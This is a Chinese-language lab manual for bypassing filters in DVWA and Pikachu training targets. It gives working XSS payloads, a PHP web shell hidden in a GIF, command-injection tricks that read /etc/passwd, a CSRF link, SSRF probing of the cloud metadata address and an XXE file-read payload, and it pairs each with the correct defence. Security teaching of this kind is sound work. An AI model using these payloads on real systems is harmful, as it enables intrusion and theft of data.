# Web 漏洞进阶实验手册（DVWA Medium/High + 变体）

> 只打自己的靶场。进阶的核心不是背 payload，是理解"过滤了什么、怎么绕"。

## 1. XSS 绕过实验（Medium/High）

目标：DVWA XSS 关卡调到 Medium/High，弹窗成功。

| 难度 | 过滤了什么 | 绕过 payload |
|---|---|---|
| Medium | 去掉 `<script>` | `<img src=x onerror=alert(1)>` |
| High | 更严格的替换 | `<img src=x onerror=alert(1)`（少个尖括号）或大小写/编码变体 |

原理：过滤是"黑名单"，总有它没想到的写法——防御正解是**输出编码 + CSP**，不是黑名单。

## 2. 文件上传绕过实验（Medium/High）

| 难度 | 过滤了什么 | 绕过 |
|---|---|---|
| Medium | 检查 Content-Type | Burp 抓包，把 `Content-Type` 改成 `image/jpeg` |
| High | 检查文件头/扩展名 | 图片马：`GIF89a` + `<?php ... ?>`，存成 `.php.jpg` 或试 `.phtml/.php5` |

做一张图片马：
```
echo "GIF89a<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php.gif
```

## 3. 命令注入绕过实验

| 被过滤 | 绕过 |
|---|---|
| `;` 和 `&&` | 用 `\|` 或 `\|\|` |
| 空格 | `${IFS}` 代替空格，如 `cat${IFS}/etc/passwd` |
| 关键字 | 拼接：`ca""t`、`cat /etc/pass''wd` |

在 DVWA 的 Medium/High 逐级试，**把每级"过滤了什么"记在打卡里**。

## 4. CSRF 实验（DVWA 自带关卡）

目标：让"受害者"（你自己开另一个浏览器）在不知情下改密码。

1. DVWA → CSRF → Low
2. 看修改密码的请求长什么样（URL 里带 `password_new=xxx`）
3. 构造一条链接发给"受害者"点开 → 密码被改 = 成功
4. Medium/High 观察加了什么防御（Referer 校验、token）——token 是正解

## 5. SSRF 实验（本地模拟）

1. 本地起一个简单 HTTP 服务：`python -m http.server 8000`
2. 找一道 SSRF 靶场题（BUUCTF 或 Pikachu 里都有），或看 Pikachu 的 SSRF 关卡
3. 理解：让**服务器**去请求 `http://127.0.0.1:8000` 而不是你自己去——服务器能看到你看不到的内网

考点：探测内网端口、读云元数据 `169.254.169.254`。

## 6. XXE 实验（Pikachu 关卡）

构造 payload 读文件：
```xml
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<a>&xxe;</a>
```
提交到有 XXE 的接口 → 响应里出现 /etc/passwd = 成功。

## 7. 每做完一类的固定动作

1. 记下"过滤了什么 + 我用什么绕的"
2. 写出**防御正解**（不是更强的黑名单）
3. 截图标进度

## 8. 完成标准

五类（XSS/上传/命令注入/CSRF/SSRF/XXE）各自至少绕过一次过滤，且能说清"绕过原理 + 正确防御"。这套做完，Web 基础就算真正毕业了。
